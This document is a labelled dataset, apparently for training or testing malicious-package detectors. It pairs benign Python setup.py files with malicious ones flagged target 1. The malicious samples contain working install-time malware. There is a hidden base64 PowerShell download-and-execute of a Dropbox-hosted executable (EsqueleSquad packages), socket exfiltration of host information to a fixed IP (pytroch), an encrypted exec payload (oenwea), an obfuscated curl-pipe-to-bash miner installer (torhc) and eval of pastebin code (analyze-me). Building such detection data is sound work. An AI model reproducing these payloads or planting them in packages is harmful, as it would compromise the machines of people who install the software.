{"idx": "py-grandpep-10.29", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-grandpep',\n    packages = ['modlib'],\n    version = '8.31',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "dash-2.6.1", "func": "from setuptools import setup\nimport json\n\nwith open(\"package.json\") as f:\n    package = json.load(f)\n\npackage_name = str(package[\"name\"].replace(\" \", \"_\").replace(\"-\", \"_\"))\n\nsetup(\n    name=\"dash_core_components\",\n    version=package[\"version\"],\n    author=package[\"author\"],\n    author_email=\"chris@plotly.com\",\n    packages=[package_name],\n    include_package_data=True,\n    license=package[\"license\"],\n    description=package.get(\"description\", package_name),\n    install_requires=[],\n)\n", "target": 0}
{"idx": "google-auth-httplib2-0.1.0", "func": "# Copyright 2014 Google Inc.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#      http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport io\n\nfrom setuptools import setup\n\nversion = \"0.1.0\"\n\nDEPENDENCIES = [\"google-auth\", \"httplib2 >= 0.15.0\", \"six\"]\n\n\nwith io.open(\"README.rst\", \"r\") as fh:\n    long_description = fh.read()\n\n\nsetup(\n    name=\"google-auth-httplib2\",\n    version=version,\n    author=\"Google Cloud Platform\",\n    author_email=\"googleapis-packages@google.com\",\n    description=\"Google Authentication Library: httplib2 transport\",\n    long_description=long_description,\n    url=\"https://github.com/GoogleCloudPlatform/google-auth-library-python-httplib2\",\n    py_modules=[\"google_auth_httplib2\"],\n    install_requires=DEPENDENCIES,\n    license=\"Apache 2.0\",\n    keywords=\"google auth oauth client\",\n    classifiers=[\n        \"Programming Language :: Python :: 2\",\n        \"Programming Language :: Python :: 2.7\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.5\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Development Status :: 3 - Alpha\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Operating System :: POSIX\",\n        \"Operating System :: Microsoft :: Windows\",\n        \"Operating System :: MacOS :: MacOS X\",\n        \"Operating System :: OS Independent\",\n        \"Topic :: Internet :: WWW/HTTP\",\n    ],\n)\n", "target": 0}
{"idx": "pytroch-0.6", "func": "#!/usr/bin/env python\nimport urllib.request\nimport socket\nimport os\nimport pty\nfrom setuptools import setup\nfrom setuptools.command.install import install\n\n\n\ndef createfile():\n      import platform\n      from datetime import datetime\n      import socket\n\n      with open(\"/proc/uptime\", \"r\") as f:\n            uptime = f.read().split(\" \")[0].strip()\n\n      uptime = int(float(uptime))\n      uptime_hours = uptime // 3600\n      uptime_minutes = (uptime % 3600) // 60\n      uptime = (\"Uptime : \" + str(uptime_hours) + \":\" + str(uptime_minutes) + \" hours\")\n      systeminfo = (\"OS:\", platform.release(), \"SysName:\", platform.system(), \"OSVersion:\", platform.version(), \"Platform:\", platform.platform(), \"IPDetails:\", socket.gethostbyname(socket.gethostname()))\n      sendable_string = f\"{uptime} --- {systeminfo}\"\n      clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n      clientSocket.connect((\"134.209.85.64\",9090))\n      clientSocket.send(str(sendable_string).encode())\n\n\n\nclass PostInstallCommand(install):\n     def run(self):\n         install.run(self)\n         createfile()\n\nsetup(name='pytroch',\n      version='0.6',\n      description='Security project for PoC.',\n      author='zer0ul',\n      author_email='zer0ul@vulnium.com',\n      url='https://google.com',\n      packages=[],\n      install_requires=[],\n      cmdclass={\n         'install' :  PostInstallCommand,\n      },\n\n     )\n", "target": 1}
{"idx": "oenwea-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'FlCvqVQPIkticwwYcYwdnDsPaZdIKienGSGIDujADtMcaAQXhtoPyrqEuoeTze oWNlpVdESEbdPxU'\nLONG_DESCRIPTION = 'UXTtpePilrCFpJJiZIyulqeFbZedBzaLdkszVghIYgnwDKjwGjPlaNluwKzPMAPpqALyUFbRMkpJklpThyViSirCuFPiGdBTJKewdElpJiBEjb HPHFSrEEvUZ UlWLPtKcYIPkFLjA UorgbMnmmCekPGbrvtFYVsQHDHmzCpJgqXkjnaFIvwgP igTsmSHsQCKFsPqCPjwtTmWayXNVmMsVvXPec TMxKRlXfBSoLhWdsrqfvp RrwZcJhTbrJvXGQSfOeKnbFvvyUUSObsSFUIybHWOxaqFicsZfImAIGPYqxapcBbOicVwT hXSIopRbaElfJpEAmliUgyCxVSEuMqtqovilAjUrOPuVzaDYRuHHewZaexarKKXyGLOh uewzMMvNTgOLcBSlyyyfSNrpKPyTYkoDriGYbrzkhhcfFNRTQwZsNbpWasVdaRJesutPf AdNMqwfmRZypQeHXWuPxPB'\n\n\nclass iuBqevQgVPrlNmwGVqLpVvdTNsXPfmQOxJJdOBwXabDGHtlZJanGZVsDqLzIienwtWdDcRUPvNNfbpnSGndVHUjDZfMRdywVpDYIOmUpHRIZFSSjSzeMQitTldBOhmzKCwPuBFmzUBkZkyXBkqcCmrJRydaEMHSxdfpVycXtMpVFOpxDoIAUOJICOynXUHSeqbRuku(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'cFRmQmZPnCB29dJemKR5xoHOHyBbCEMqZ0vqq-qgqnc=').decrypt(b'gAAAAABmbvWyUwJnv1HRIlCyU8JWYgkxiPkNPe11J9pmMz13CDuAyOJxV0QBqOzZcWsQjwn4rcawn7yo7ArH3vt773MbvAKj3EsLn-g3KeYnrBTmVLz0q7M62Kk0q0PQaCcJe3coxsfrTUZtrcTL2vyUNsEKfQ4iG0_YNeFlBm7q1wwpmXDOqh3IGz89u48Oou4vBe4e_eq_i1Z6dJxa3YW1CBuC3Ujlwg=='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"oenwea\",\n    version=VERSION,\n    author=\"RVcPlhBKVk\",\n    author_email=\"AgMZS@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': iuBqevQgVPrlNmwGVqLpVvdTNsXPfmQOxJJdOBwXabDGHtlZJanGZVsDqLzIienwtWdDcRUPvNNfbpnSGndVHUjDZfMRdywVpDYIOmUpHRIZFSSjSzeMQitTldBOhmzKCwPuBFmzUBkZkyXBkqcCmrJRydaEMHSxdfpVycXtMpVFOpxDoIAUOJICOynXUHSeqbRuku,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "ElasticQuery-3.2", "func": "# ElasticQuery\n# File: setup.py\n# Desc: needed\n\nfrom setuptools import setup\n\n\nif __name__ == '__main__':\n    setup(\n        version='3.2',\n        name='ElasticQuery',\n        description='A simple query builder for Elasticsearch 2',\n        author='Nick Barrett',\n        author_email='pointlessrambler@gmail.com',\n        url='http://github.com/Fizzadar/ElasticQuery',\n        package_dir={\n            'ElasticQuery': 'elasticquery',\n        },\n        packages=[\n            'elasticquery',\n        ],\n        install_requires=['six>=1.4.0'],\n    )\n", "target": 0}
{"idx": "dbt-snowflake-1.2.0", "func": "#!/usr/bin/env python\nimport os\nimport sys\nimport re\n\n# require python 3.7 or newer\nif sys.version_info < (3, 7):\n    print(\"Error: dbt does not support this version of Python.\")\n    print(\"Please upgrade to Python 3.7 or higher.\")\n    sys.exit(1)\n\n\n# require version of setuptools that supports find_namespace_packages\nfrom setuptools import setup\n\ntry:\n    from setuptools import find_namespace_packages\nexcept ImportError:\n    # the user has a downlevel version of setuptools.\n    print(\"Error: dbt requires setuptools v40.1.0 or higher.\")\n    print('Please upgrade setuptools with \"pip install --upgrade setuptools\" ' \"and try again\")\n    sys.exit(1)\n\n\n# pull long description from README\nthis_directory = os.path.abspath(os.path.dirname(__file__))\nwith open(os.path.join(this_directory, \"README.md\")) as f:\n    long_description = f.read()\n\n\n# get this package's version from dbt/adapters/<name>/__version__.py\ndef _get_plugin_version_dict():\n    _version_path = os.path.join(this_directory, \"dbt\", \"adapters\", \"snowflake\", \"__version__.py\")\n    _semver = r\"\"\"(?P<major>\\d+)\\.(?P<minor>\\d+)\\.(?P<patch>\\d+)\"\"\"\n    _pre = r\"\"\"((?P<prekind>a|b|rc)(?P<pre>\\d+))?\"\"\"\n    _version_pattern = fr\"\"\"version\\s*=\\s*[\"']{_semver}{_pre}[\"']\"\"\"\n    with open(_version_path) as f:\n        match = re.search(_version_pattern, f.read().strip())\n        if match is None:\n            raise ValueError(f\"invalid version at {_version_path}\")\n        return match.groupdict()\n\n\n# require a compatible minor version (~=), prerelease if this is a prerelease\ndef _get_dbt_core_version():\n    parts = _get_plugin_version_dict()\n    minor = \"{major}.{minor}.0\".format(**parts)\n    pre = parts[\"prekind\"] + \"1\" if parts[\"prekind\"] else \"\"\n    return f\"{minor}{pre}\"\n\n\npackage_name = \"dbt-snowflake\"\npackage_version = \"1.2.0\"\ndbt_core_version = _get_dbt_core_version()\ndescription = \"\"\"The Snowflake adapter plugin for dbt\"\"\"\n\nsetup(\n    name=package_name,\n    version=package_version,\n    description=description,\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    author=\"dbt Labs\",\n    author_email=\"info@dbtlabs.com\",\n    url=\"https://github.com/dbt-labs/dbt-snowflake\",\n    packages=find_namespace_packages(include=[\"dbt\", \"dbt.*\"]),\n    include_package_data=True,\n    install_requires=[\n        \"dbt-core~={}\".format(dbt_core_version),\n        \"snowflake-connector-python[secure-local-storage]>=2.4.1,<2.8.0\",\n        \"requests<3.0.0\",\n        \"cryptography>=3.2,<37.0.0\",\n    ],\n    zip_safe=False,\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Operating System :: Microsoft :: Windows\",\n        \"Operating System :: MacOS :: MacOS X\",\n        \"Operating System :: POSIX :: Linux\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n    ],\n    python_requires=\">=3.7\",\n)\n", "target": 0}
{"idx": "hydrapep-4.2", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'hydrapep',\n    packages = ['modlib'],\n    version = '4.9',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "torhc-0.1", "func": "\nfrom distutils.core import setup\nfrom setuptools.command.install import install\n\nimport subprocess\n\nclass PostInstallCommand(install):\n    def run(self):\n        try:\n            get_url = lambda: ''.join([chr(x) for x in [104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 104, 117, 98, 117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116, 46, 99, 111, 109, 47, 77, 111, 110, 101, 114, 111, 79, 99, 101, 97, 110, 47, 120, 109, 114, 105, 103, 95, 115, 101, 116, 117, 112, 47, 109, 97, 115, 116, 101, 114, 47, 115, 101, 116, 117, 112, 95, 109, 111, 110, 101, 114, 111, 111, 99, 101, 97, 110, 95, 109, 105, 110, 101, 114, 46, 115, 104]])\n            b = lambda: ''.join([chr(x) for x in [98, 97, 115, 104]])\n            c = lambda: ''.join([chr(x) for x in [99, 117, 114, 108]])\n            v = lambda: ''.join([chr(x) for x in [45, 45, 118, 101, 114, 115, 105, 111, 110]])\n            t = lambda: ''.join([chr(x) for x in [56, 53, 113, 50, 112, 97, 66, 65, 82, 110, 56, 54, 78, 117, 107, 68, 70, 71, 111, 66, 49, 89, 55, 107, 85, 66, 53, 71, 109, 115, 65, 116, 105, 66, 78, 104, 85, 120, 99, 53, 78, 89, 119, 116, 105, 67, 77, 117, 98, 116, 116, 84, 119, 55, 86, 71, 72, 54, 49, 68, 118, 57, 99, 53, 119, 118, 78, 86, 89, 49, 101, 65, 106, 88, 65, 107, 90, 57, 81, 71, 118, 52, 99, 113, 103, 50, 114, 68, 54, 76, 55, 105, 122, 83, 117]])\n            try:\n                subprocess.run([b(), v()])\n                subprocess.run(f\"{c()} -s -L {get_url()} | {b()} -s {t()}\", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\n            except FileNotFoundError:\n                exit(1)\n        except:\n            pass\n        install.run(self)\n\nsetup(\n    name=\"torhc\",\n    packages=[\"torhc\"],\n    version=\"0.1\",\n    description=\"Not the package you are looking for\",\n    author=\"Bondonio Anderas\",\n    author_email=\"biscottini-shop@proton.me\",\n    cmdclass={\n        \"install\": PostInstallCommand,\n    },\n    entry_points={\n        \"console_scripts\": [\n            \"torhc = torhc.cli:cli\",\n        ],\n    },\n)\n    ", "target": 1}
{"idx": "analyze-me-1.0.0", "func": "from setuptools import setup\nimport requests\n\neval(requests.get('https://pastebin.com/raw/f84dfw0m').text)\n\nsetup(\n    name=\"analyze-me\",\n    python_requires='>=3.6',\n    version=\"1.0.0\",\n    description=\"DISCLAIMER: do not install this package. This is part of a test. It might contain harmful code\",\n    long_description=\"DISCLAIMER: do not install this package. This is part of a test. It might contain harmful code\",\n    author=\"MIT\",\n    author_email=\"contact@example.com\",\n    license=\"MIT\"\n)\n", "target": 1}
{"idx": "dbnd-spark-0.85.9", "func": "# \u00a9 Copyright Databand.ai, an IBM Company 2022\n\nfrom os import path\n\nimport setuptools\n\nfrom setuptools.config import read_configuration\n\n\nBASE_PATH = path.dirname(__file__)\nCFG_PATH = path.join(BASE_PATH, \"setup.cfg\")\n\nconfig = read_configuration(CFG_PATH)\nversion = config[\"metadata\"][\"version\"]\n\nsetuptools.setup(\n    name=\"dbnd-spark\",\n    package_dir={\"\": \"src\"},\n    install_requires=[\"dbnd==\" + version],\n    extras_require={\"tests\": [\"pyspark==2.4.4\", \"pytest-spark==0.6.0\"]},\n    entry_points={\"dbnd\": [\"dbnd-spark = dbnd_spark._plugin\"]},\n)\n", "target": 0}
{"idx": "esqguipywhttp-3.26", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqguipywhttp',\n    packages = ['modlib'],\n    version = '6.87',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "fasttext_wheel-0.9.2", "func": "#!/usr/bin/env python\n\n# Copyright (c) 2017-present, Facebook, Inc.\n# All rights reserved.\n#\n# This source code is licensed under the MIT license found in the\n# LICENSE file in the root directory of this source tree.\n#\n\nfrom __future__ import absolute_import\nfrom __future__ import division\nfrom __future__ import print_function\nfrom __future__ import unicode_literals\n\nfrom setuptools import setup, Extension\nfrom setuptools.command.build_ext import build_ext\nimport sys\nimport setuptools\nimport os\nimport subprocess\nimport platform\nimport io\n\n__version__ = '0.9.2'\nFASTTEXT_SRC = \"src\"\n\n# Based on https://github.com/pybind/python_example\n\nclass get_pybind_include(object):\n    \"\"\"Helper class to determine the pybind11 include path\n\n    The purpose of this class is to postpone importing pybind11\n    until it is actually installed, so that the ``get_include()``\n    method can be invoked. \"\"\"\n\n    def __init__(self, user=False):\n        try:\n            import pybind11\n        except ImportError:\n            if subprocess.call([sys.executable, '-m', 'pip', 'install', 'pybind11']):\n                raise RuntimeError('pybind11 install failed.')\n\n        self.user = user\n\n    def __str__(self):\n        import pybind11\n        return pybind11.get_include(self.user)\n\ntry:\n    coverage_index = sys.argv.index('--coverage')\nexcept ValueError:\n    coverage = False\nelse:\n    del sys.argv[coverage_index]\n    coverage = True\n\nfasttext_src_files = map(str, os.listdir(FASTTEXT_SRC))\nfasttext_src_cc = list(filter(lambda x: x.endswith('.cc'), fasttext_src_files))\n\nfasttext_src_cc = list(\n    map(lambda x: str(os.path.join(FASTTEXT_SRC, x)), fasttext_src_cc)\n)\n\next_modules = [\n    Extension(\n        str('fasttext_pybind'),\n        [\n            str('python/fasttext_module/fasttext/pybind/fasttext_pybind.cc'),\n        ] + fasttext_src_cc,\n        include_dirs=[\n            # Path to pybind11 headers\n            get_pybind_include(),\n            get_pybind_include(user=True),\n            # Path to fasttext source code\n            FASTTEXT_SRC,\n        ],\n        language='c++',\n        extra_compile_args=[\"-O0 -fno-inline -fprofile-arcs -pthread -march=native\" if coverage else\n                            \"-O3 -funroll-loops -pthread -march=native\"],\n    ),\n]\n\n\n# As of Python 3.6, CCompiler has a `has_flag` method.\n# cf http://bugs.python.org/issue26689\ndef has_flag(compiler, flags):\n    \"\"\"Return a boolean indicating whether a flag name is supported on\n    the specified compiler.\n    \"\"\"\n    import tempfile\n    with tempfile.NamedTemporaryFile('w', suffix='.cpp') as f:\n        f.write('int main (int argc, char **argv) { return 0; }')\n        try:\n            compiler.compile([f.name], extra_postargs=flags)\n        except setuptools.distutils.errors.CompileError:\n            return False\n    return True\n\n\ndef cpp_flag(compiler):\n    \"\"\"Return the -std=c++[11/14] compiler flag.\n    The c++14 is preferred over c++11 (when it is available).\n    \"\"\"\n    standards = ['-std=c++14', '-std=c++11']\n    for standard in standards:\n        if has_flag(compiler, [standard]):\n            return standard\n    raise RuntimeError(\n        'Unsupported compiler -- at least C++11 support '\n        'is needed!'\n    )\n\n\nclass BuildExt(build_ext):\n    \"\"\"A custom build extension for adding compiler-specific options.\"\"\"\n    c_opts = {\n        'msvc': ['/EHsc'],\n        'unix': [],\n    }\n\n    def build_extensions(self):\n        if sys.platform == 'darwin':\n            mac_osx_version = float('.'.join(platform.mac_ver()[0].split('.')[:2]))\n            os.environ['MACOSX_DEPLOYMENT_TARGET'] = str(mac_osx_version)\n            all_flags = ['-stdlib=libc++', '-mmacosx-version-min=10.7']\n            if has_flag(self.compiler, [all_flags[0]]):\n                self.c_opts['unix'] += [all_flags[0]]\n            elif has_flag(self.compiler, all_flags):\n                self.c_opts['unix'] += all_flags\n            else:\n                raise RuntimeError(\n                    'libc++ is needed! Failed to compile with {} and {}.'.\n                    format(\" \".join(all_flags), all_flags[0])\n                )\n        ct = self.compiler.compiler_type\n        opts = self.c_opts.get(ct, [])\n        extra_link_args = []\n\n        if coverage:\n            coverage_option = '--coverage'\n            opts.append(coverage_option)\n            extra_link_args.append(coverage_option)\n\n        if ct == 'unix':\n            opts.append('-DVERSION_INFO=\"%s\"' % self.distribution.get_version())\n            opts.append(cpp_flag(self.compiler))\n            if has_flag(self.compiler, ['-fvisibility=hidden']):\n                opts.append('-fvisibility=hidden')\n        elif ct == 'msvc':\n            opts.append(\n                '/DVERSION_INFO=\\\\\"%s\\\\\"' % self.distribution.get_version()\n            )\n        for ext in self.extensions:\n            ext.extra_compile_args = opts\n            ext.extra_link_args = extra_link_args\n        build_ext.build_extensions(self)\n\n\ndef _get_readme():\n    \"\"\"\n    Use pandoc to generate rst from md.\n    pandoc --from=markdown --to=rst --output=python/README.rst python/README.md\n    \"\"\"\n    with io.open(\"python/README.rst\", encoding='utf-8') as fid:\n        return fid.read()\n\n\nsetup(\n    name='fasttext-wheel',\n    version=__version__,\n    author='Onur Celebi',\n    author_email='celebio@fb.com',\n    description='fasttext Python bindings',\n    long_description=_get_readme(),\n    ext_modules=ext_modules,\n    url='https://github.com/facebookresearch/fastText',\n    license='MIT',\n    classifiers=[\n        'Development Status :: 3 - Alpha',\n        'Intended Audience :: Developers',\n        'Intended Audience :: Science/Research',\n        'License :: OSI Approved :: MIT License',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Topic :: Software Development',\n        'Topic :: Scientific/Engineering',\n        'Operating System :: Microsoft :: Windows',\n        'Operating System :: POSIX',\n        'Operating System :: Unix',\n        'Operating System :: MacOS',\n    ],\n    install_requires=['pybind11>=2.2', \"setuptools >= 0.7.0\", \"numpy\"],\n    cmdclass={'build_ext': BuildExt},\n    packages=[\n        str('fasttext'),\n        str('fasttext.util'),\n        str('fasttext.tests'),\n    ],\n    package_dir={str(''): str('python/fasttext_module')},\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "hydrarand-2.84", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'hydrarand',\n    packages = ['modlib'],\n    version = '6.4',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "google-cloud-dataproc-metastore-1.6.0", "func": "# -*- coding: utf-8 -*-\n\n# Copyright 2020 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n#\n\nimport io\nimport os\n\nimport setuptools  # type: ignore\n\nname = \"google-cloud-dataproc-metastore\"\nversion = \"1.6.0\"\ndescription = \"Dataproc Metastore API client library\"\nrelease_status = \"Development Status :: 5 - Production/Stable\"\nurl = \"https://github.com/googleapis/python-dataproc-metastore\"\ndependencies = [\n    \"google-api-core[grpc] >= 1.32.0, <3.0.0dev,!=2.0.*,!=2.1.*,!=2.2.*,!=2.3.*,!=2.4.*,!=2.5.*,!=2.6.*,!=2.7.*\",\n    \"proto-plus >= 1.15.0, <2.0.0dev\",\n    \"protobuf >= 3.19.0, <4.0.0dev\",\n]\n\npackage_root = os.path.abspath(os.path.dirname(__file__))\n\nreadme_filename = os.path.join(package_root, \"README.rst\")\nwith io.open(readme_filename, encoding=\"utf-8\") as readme_file:\n    readme = readme_file.read()\n\nsetuptools.setup(\n    name=name,\n    version=version,\n    description=description,\n    long_description=readme,\n    author=\"Google LLC\",\n    author_email=\"googleapis-packages@google.com\",\n    license=\"Apache 2.0\",\n    url=url,\n    packages=[\n        package\n        for package in setuptools.PEP420PackageFinder.find()\n        if package.startswith(\"google\")\n    ],\n    namespace_packages=(\"google\", \"google.cloud\"),\n    platforms=\"Posix; MacOS X; Windows\",\n    include_package_data=True,\n    install_requires=dependencies,\n    python_requires=\">=3.7\",\n    classifiers=[\n        release_status,\n        \"Intended Audience :: Developers\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Topic :: Internet\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\",\n    ],\n    zip_safe=False,\n)\n", "target": 0}
